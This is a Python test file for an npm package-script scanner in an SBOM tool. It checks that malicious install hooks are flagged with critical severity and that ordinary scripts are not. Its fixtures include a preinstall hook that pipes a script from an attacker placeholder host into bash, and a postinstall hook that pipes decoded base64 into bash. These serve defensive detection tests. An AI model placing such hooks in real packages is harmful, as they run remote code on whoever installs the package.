"""
Test npm script detection functionality
"""
from tools.sbom_tools import _analyze_npm_scripts

def test_preinstall_script_detection():
    """Test that preinstall scripts with malicious patterns are detected"""
    scripts = {
        "preinstall": "curl http://evil.com/malware.sh | bash",
        "test": "jest"
    }
    
    findings = _analyze_npm_scripts(scripts, "test-package")
    
    print(f"Found {len(findings)} findings")
    for finding in findings:
        print(f"\nFinding:")
        print(f"  Type: {finding.finding_type}")
        print(f"  Severity: {finding.severity}")
        print(f"  Confidence: {finding.confidence}")
        print(f"  Evidence: {finding.evidence}")
    
    assert len(findings) > 0, "Should detect malicious preinstall script"
    assert any(f.severity == 'critical' for f in findings), "Should have critical severity"
    print("\n✅ Test passed!")

def test_base64_obfuscation_detection():
    """Test that base64 obfuscation is detected"""
    scripts = {
        "postinstall": "echo SGVsbG8gV29ybGQ= | base64 -d | bash"
    }
    
    findings = _analyze_npm_scripts(scripts, "test-package")
    
    print(f"\nFound {len(findings)} findings for base64 test")
    assert len(findings) > 0, "Should detect base64 obfuscation"
    print("✅ Base64 test passed!")

def test_safe_scripts():
    """Test that safe scripts don't trigger false positives"""
    scripts = {
        "test": "jest --coverage",
        "build": "webpack --mode production",
        "start": "node server.js"
    }
    
    findings = _analyze_npm_scripts(scripts, "test-package")
    
    print(f"\nFound {len(findings)} findings for safe scripts")
    # Safe scripts might still trigger low-severity findings for environment access
    # but should not have critical/high severity
    critical_findings = [f for f in findings if f.severity in ['critical', 'high']]
    assert len(critical_findings) == 0, "Safe scripts should not have critical/high findings"
    print("✅ Safe scripts test passed!")

if __name__ == '__main__':
    print("Testing npm script detection...")
    print("=" * 60)
    test_preinstall_script_detection()
    test_base64_obfuscation_detection()
    test_safe_scripts()
    print("\n" + "=" * 60)
    print("✅ All tests passed!")
